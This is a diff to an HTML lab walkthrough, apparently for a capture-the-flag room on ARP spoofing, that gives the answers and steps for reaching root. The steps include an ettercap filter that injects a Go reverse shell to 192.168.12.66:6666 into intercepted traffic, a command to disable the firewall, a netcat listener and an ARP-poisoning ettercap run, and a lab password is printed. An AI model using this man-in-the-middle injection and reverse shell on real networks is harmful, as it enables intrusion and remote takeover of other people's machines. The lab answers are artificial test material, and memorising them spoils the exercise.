@@ -5,9 +5,8 @@
   <b> Note The admin user is in the sudo group. I suggest using the root user to complete this room <br>
       sudo su (password : Layer2)</b><br>
   
-  Q.1    Now, can you (re)gain access? (Yay/Nay).<br>
-  Ans.   Yea
-  <br>
+  Q.1    Now, can you (re)gain access? (Yay/Nay).
+  Ans.   Yea <br>
   <b>TASK 3 </b><br>
   Q. 1 What is your IP address? <br>
   <b>  ip address show eth1 </b><br>
@@ -94,22 +93,27 @@
     <b>Follow steps to find root flag</b><br>
     hint: follow these steps on ssh machine not on your local machine<br>
      step 1. copy and save in a whoami.ecf file  <br><br>
-     <b>if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
+     <b> 
+   if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
     log(DATA.data, "/root/ettercap.log");
     replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );
     msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
- } </b><br>
+}  
+</b><br>
  
  step 2. compile source code with etterfilter<br>
   <b>etterfilter whoami.ecf -o whoami.ef</b><br>
   step 3. Disable firewall <br>
     <b>sudo ufw disable  (password: Layer2)</b><br>
   step 4. open one another ssh session and start netcat listener<br>
+  hint: use same port in source code and netcat listener<br>
   <b>nc -nvlp 6666 & </b><br>
   step 5. Run ettercap <br>
   <b>sudo ettercap -T -i eth1 -M arp -F whoami.ef </b><br><br>
   A few seconds after executing this command, you should see  "Connection received on 192.168.12.20 " on netcat listerer<br>
   step 6. on netcat listener type "fg" to foreground listener<br>
+  
+  Enjoy revershell
   
   <img src=""><br>
   
